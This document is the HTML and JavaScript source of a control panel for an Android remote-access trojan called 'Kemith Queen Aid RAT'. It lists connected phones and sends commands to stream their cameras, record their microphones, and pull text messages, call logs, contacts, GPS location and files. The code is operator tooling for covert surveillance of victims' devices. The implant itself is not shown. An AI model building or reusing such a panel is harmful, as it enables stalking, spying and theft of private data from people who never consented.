<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kemith Queen Aid RAT - Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(90deg, #1a1a2e, #16213e);
            padding: 20px;
            border-bottom: 2px solid #00ff00;
            text-align: center;
        }
        .header h1 {
            font-size: 2em;
            text-shadow: 0 0 10px #00ff00;
        }
        .container {
            display: flex;
            height: calc(100vh - 80px);
        }
        .sidebar {
            width: 300px;
            background: #1a1a1a;
            border-right: 1px solid #333;
            padding: 20px;
            overflow-y: auto;
        }
        .client-card {
            background: #2a2a2a;
            border: 1px solid #444;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .client-card:hover {
            border-color: #00ff00;
            box-shadow: 0 0 10px rgba(0,255,0,0.2);
        }
        .client-card.active {
            border-color: #00ff00;
            background: #1a2a1a;
        }
        .client-status {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff00;
            margin-right: 8px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
        .main-content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
        }
        .tab-buttons {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .tab-btn {
            background: #2a2a2a;
            border: 1px solid #444;
            color: #00ff00;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.3s;
        }
        .tab-btn:hover, .tab-btn.active {
            background: #00ff00;
            color: #000;
        }
        .panel {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 20px;
            display: none;
        }
        .panel.active {
            display: block;
        }
        .camera-feed {
            width: 100%;
            max-width: 640px;
            height: 480px;
            background: #000;
            border: 2px solid #00ff00;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.2em;
        }
        .data-list {
            list-style: none;
        }
        .data-list li {
            background: #2a2a2a;
            border: 1px solid #444;
            padding: 10px;
            margin-bottom: 5px;
            border-radius: 4px;
        }
        .command-btn {
            background: #00ff00;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            border-radius: 4px;
            font-weight: bold;
            margin: 5px;
            transition: all 0.3s;
        }
        .command-btn:hover {
            background: #00cc00;
            transform: scale(1.05);
        }
        .log-console {
            background: #000;
            border: 1px solid #333;
            border-radius: 4px;
            padding: 10px;
            height: 200px;
            overflow-y: auto;
            font-size: 0.9em;
            margin-top: 20px;
        }
        .log-entry {
            margin-bottom: 3px;
        }
        .log-time { color: #666; }
        .log-info { color: #00ff00; }
        .log-error { color: #ff0000; }
    </style>
</head>
<body>
    <div class="header">
        <h1>👑 Kemith Queen Aid RAT 👑</h1>
        <p>Advanced Android Remote Administration Tool</p>
    </div>

    <div class="container">
        <div class="sidebar">
            <h3>Connected Devices</h3>
            <div id="clientList"></div>
        </div>

        <div class="main-content">
            <div id="noClientSelected" style="text-align: center; padding: 50px;">
                <h2>Select a device from the sidebar</h2>
            </div>

            <div id="clientPanel" style="display: none;">
                <h2 id="deviceName">Device Name</h2>

                <div class="tab-buttons">
                    <button class="tab-btn active" onclick="showTab('camera')">📷 Camera</button>
                    <button class="tab-btn" onclick="showTab('sms')">💬 SMS</button>
                    <button class="tab-btn" onclick="showTab('calls')">📞 Calls</button>
                    <button class="tab-btn" onclick="showTab('contacts')">👥 Contacts</button>
                    <button class="tab-btn" onclick="showTab('location')">📍 Location</button>
                    <button class="tab-btn" onclick="showTab('files')">📁 Files</button>
                    <button class="tab-btn" onclick="showTab('mic')">🎤 Microphone</button>
                </div>

                <div id="camera" class="panel active">
                    <h3>Live Camera Feed</h3>
                    <div class="camera-feed" id="cameraFeed">
                        <span>Click "Start Camera" to begin streaming</span>
                    </div>
                    <button class="command-btn" onclick="sendCommand('camera_start')">Start Camera</button>
                    <button class="command-btn" onclick="sendCommand('camera_stop')">Stop Camera</button>
                    <button class="command-btn" onclick="sendCommand('camera_switch')">Switch Camera</button>
                </div>

                <div id="sms" class="panel">
                    <h3>SMS Messages</h3>
                    <button class="command-btn" onclick="sendCommand('get_sms')">Refresh SMS</button>
                    <ul class="data-list" id="smsList"></ul>
                </div>

                <div id="calls" class="panel">
                    <h3>Call Logs</h3>
                    <button class="command-btn" onclick="sendCommand('get_calls')">Refresh Calls</button>
                    <ul class="data-list" id="callsList"></ul>
                </div>

                <div id="contacts" class="panel">
                    <h3>Contacts</h3>
                    <button class="command-btn" onclick="sendCommand('get_contacts')">Refresh Contacts</button>
                    <ul class="data-list" id="contactsList"></ul>
                </div>

                <div id="location" class="panel">
                    <h3>GPS Location</h3>
                    <button class="command-btn" onclick="sendCommand('get_location')">Get Location</button>
                    <div id="locationData" style="margin-top: 20px;"></div>
                </div>

                <div id="files" class="panel">
                    <h3>File Manager</h3>
                    <button class="command-btn" onclick="sendCommand('list_files')">List Files</button>
                    <ul class="data-list" id="filesList"></ul>
                </div>

                <div id="mic" class="panel">
                    <h3>Microphone Recording</h3>
                    <button class="command-btn" onclick="sendCommand('mic_start')">Start Recording</button>
                    <button class="command-btn" onclick="sendCommand('mic_stop')">Stop Recording</button>
                    <audio id="micAudio" controls style="margin-top: 20px; width: 100%;"></audio>
                </div>
            </div>

            <div class="log-console" id="logConsole">
                <div class="log-entry"><span class="log-time">[00:00:00]</span> <span class="log-info">System initialized...</span></div>
            </div>
        </div>
    </div>

    <script>
        let ws;
        let selectedClient = null;
        let clients = {};

        function connect() {
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            ws = new WebSocket(`${protocol}//${window.location.host}`);

            ws.onopen = () => {
                log('Connected to server', 'info');
            };

            ws.onmessage = (event) => {
                const msg = JSON.parse(event.data);
                handleMessage(msg);
            };

            ws.onclose = () => {
                log('Disconnected, reconnecting...', 'warn');
                setTimeout(connect, 3000);
            };
        }

        function handleMessage(msg) {
            switch(msg.type) {
                case 'client_connected':
                    clients[msg.clientId] = msg.deviceInfo;
                    updateClientList();
                    log(`Device connected: ${msg.deviceInfo.model}`, 'info');
                    break;
                case 'client_disconnected':
                    delete clients[msg.clientId];
                    updateClientList();
                    log('Device disconnected', 'warn');
                    break;
                case 'sms_list':
                    updateSMSList(msg.data);
                    break;
                case 'call_logs':
                    updateCallsList(msg.data);
                    break;
                case 'contacts':
                    updateContactsList(msg.data);
                    break;
                case 'camera_stream':
                    updateCameraFeed(msg.data);
                    break;
                case 'location':
                    updateLocation(msg.data);
                    break;
            }
        }

        function updateClientList() {
            const list = document.getElementById('clientList');
            list.innerHTML = '';

            Object.entries(clients).forEach(([id, info]) => {
                const card = document.createElement('div');
                card.className = 'client-card' + (selectedClient === id ? ' active' : '');
                card.innerHTML = `
                    <span class="client-status"></span>
                    <strong>${info.model || 'Unknown'}</strong><br>
                    <small>${info.manufacturer || 'Unknown'} | Android ${info.version || '?'}</small>
                `;
                card.onclick = () => selectClient(id);
                list.appendChild(card);
            });
        }

        function selectClient(id) {
            selectedClient = id;
            updateClientList();
            document.getElementById('noClientSelected').style.display = 'none';
            document.getElementById('clientPanel').style.display = 'block';
            document.getElementById('deviceName').textContent = clients[id].model || 'Unknown Device';
        }

        function showTab(tab) {
            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(tab).classList.add('active');
            event.target.classList.add('active');
        }

        function sendCommand(command, params = {}) {
            if (!selectedClient) {
                log('No device selected!', 'error');
                return;
            }

            fetch(`/api/command/${selectedClient}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command, params })
            });

            log(`Command sent: ${command}`, 'info');
        }

        function log(message, type = 'info') {
            const console = document.getElementById('logConsole');
            const time = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-${type}">${message}</span>`;
            console.appendChild(entry);
            console.scrollTop = console.scrollHeight;
        }

        function updateSMSList(data) {
            const list = document.getElementById('smsList');
            list.innerHTML = data.map(sms => `
                <li><strong>${sms.address}</strong> - ${sms.body} <small>(${sms.date})</small></li>
            `).join('');
        }

        function updateCallsList(data) {
            const list = document.getElementById('callsList');
            list.innerHTML = data.map(call => `
                <li><strong>${call.number}</strong> - ${call.type} <small>(${call.duration}s)</small></li>
            `).join('');
        }

        function updateContactsList(data) {
            const list = document.getElementById('contactsList');
            list.innerHTML = data.map(contact => `
                <li><strong>${contact.name}</strong> - ${contact.phone}</li>
            `).join('');
        }

        function updateCameraFeed(data) {
            const feed = document.getElementById('cameraFeed');
            feed.innerHTML = `<img src="data:image/jpeg;base64,${data}" style="width: 100%; height: 100%; object-fit: contain;">`;
        }

        function updateLocation(data) {
            document.getElementById('locationData').innerHTML = `
                <p>Latitude: ${data.lat}</p>
                <p>Longitude: ${data.lng}</p>
                <p>Accuracy: ${data.accuracy}m</p>
            `;
        }

        connect();
    </script>
</body>
</html>
